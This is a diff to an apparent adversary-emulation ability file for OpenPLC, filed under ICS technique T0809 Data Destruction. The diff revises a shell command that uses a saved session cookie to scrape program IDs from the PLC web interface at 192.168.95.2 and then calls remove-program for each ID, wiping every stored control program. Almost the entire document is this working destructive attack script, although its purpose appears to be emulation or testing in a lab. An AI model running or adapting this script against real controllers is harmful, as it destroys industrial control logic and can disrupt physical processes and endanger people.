@@ -3,7 +3,8 @@
 - id: c9d0e1f2-9999-9999-9999-000000000004
   name: OpenPLC - Data Destruction of PLC Programs
   description: |
-    Delete programs via the correct /remove-program endpoint.
+    remove-program expects query id= (Prog_ID), not program_name. This ability parses
+    /programs for remove-program?id= links, then GETs each remove-program URL.
   tactic: inhibit-response-function
   technique_id: T0809
   technique_name: Data Destruction
@@ -11,12 +12,16 @@
   - platform: linux
     name: sh
     command: >
-      for prog in 326339.st 690525.st 655326.st blank_program.st; do
+      curl -s -b /tmp/plc_cookies.txt
+      "http://192.168.95.2:8080/programs"
+      -o /tmp/programs_for_delete.html &&
+      IDS=$(grep -oE 'remove-program[?]id=[0-9]+' /tmp/programs_for_delete.html | sed 's/.*id=//' | sort -u) &&
+      echo "IDS=$IDS" &&
+      for id in $IDS; do
         curl -s -b /tmp/plc_cookies.txt
-        -d "program_name=$prog"
-        "http://192.168.95.2:8080/remove-program"
-        -o /dev/null;
-        echo "DELETED: $prog";
+        "http://192.168.95.2:8080/remove-program?id=$id"
+        -o /dev/null &&
+        echo "REMOVE_REQUEST id=$id";
       done &&
-      echo "ALL_PROGRAMS_DESTROYED"
-    timeout: 60
+      echo "PROGRAM_DELETE_ATTEMPTS_DONE"
+    timeout: 120
